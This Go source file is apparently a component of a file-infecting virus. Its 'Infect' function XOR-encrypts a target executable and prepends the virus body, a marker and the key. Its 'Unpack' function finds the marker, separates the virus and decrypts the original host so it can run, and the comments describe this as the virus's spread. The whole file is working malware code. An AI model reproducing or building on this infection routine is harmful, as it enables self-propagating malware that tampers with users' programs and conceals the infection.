package infect

import (
	"bytes"
	"io/ioutil"
)

var (
	// InfectMark is the mark we give our binary to let the infector know we have
	// already infected the binary. It also acts as a delimiter between the host
	// and the virus
	InfectMark = append([]byte{0, 1, 2, 3, 4, 5, 6, 7, 8, 9}, make([]byte, 100)...)
)

// Infect will take the binary at `path`, infect `path` with `virus` and return
// a key
func Infect(path string, virus []byte) []byte {
	binary, err := ioutil.ReadFile(path)
	if err != nil {
		panic(err)
	}

	key := generateKey()

	encBinary := xor(binary, key)

	newBinary := virus[:]
	newBinary = append(newBinary, InfectMark...)
	newBinary = append(newBinary, key...)
	newBinary = append(newBinary, encBinary...)

	return newBinary
}

// Unpack will find the key and host of the file to decrypt it and execute
func Unpack(path string) (virus, host []byte) {
	binary, err := ioutil.ReadFile(path)
	if err != nil {
		panic(err)
	}

	infectIndex := bytes.Index(binary, InfectMark)

	// If there is no mark, then the current binary IS the virus.
	// This is the initial spread
	if infectIndex == -1 {
		return binary, nil
	}

	virus = binary[:infectIndex]

	keyBeginI := infectIndex + len(InfectMark)
	keyEndI := keyBeginI + KeyLength
	key := binary[keyBeginI:keyEndI]

	host = xor(binary[keyEndI:], key)

	return
}
